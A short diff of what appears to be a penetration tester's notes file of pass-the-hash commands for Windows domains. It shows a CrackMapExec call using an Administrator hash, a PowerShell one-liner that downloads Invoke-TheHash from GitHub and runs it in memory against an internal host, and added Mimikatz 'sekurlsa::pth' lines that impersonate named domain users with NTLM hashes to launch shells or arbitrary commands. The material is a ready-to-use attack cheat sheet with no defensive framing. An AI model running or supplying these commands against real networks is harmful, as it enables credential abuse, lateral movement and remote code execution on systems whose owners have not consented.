@@ -10,3 +10,8 @@ C:\CrackMapExecWin\crackmapexec.exe %userdnsdomain% -u Administrator -H cc36cf7a
 
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-TheHash.ps1' -UseBasicParsing); Invoke-TheHash -Type WMIExec -Username 'Jerome' -Hash '[NTLM-Hash]' -Target '192.168.219.136
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Jerome /domain:MAYIRUDC.com /ntlm:<NTLM> /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Moe /domain:Security.local /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:powershell.exe"'
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Jerome /domain:MAYIRUDC.com /ntlm:HASH /run:"YourCommand"''
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Jerome /domain:MAYIRUDC.com /ntlm:HASH /run:powershell.exe -Command "YourPowerShellCommand"''
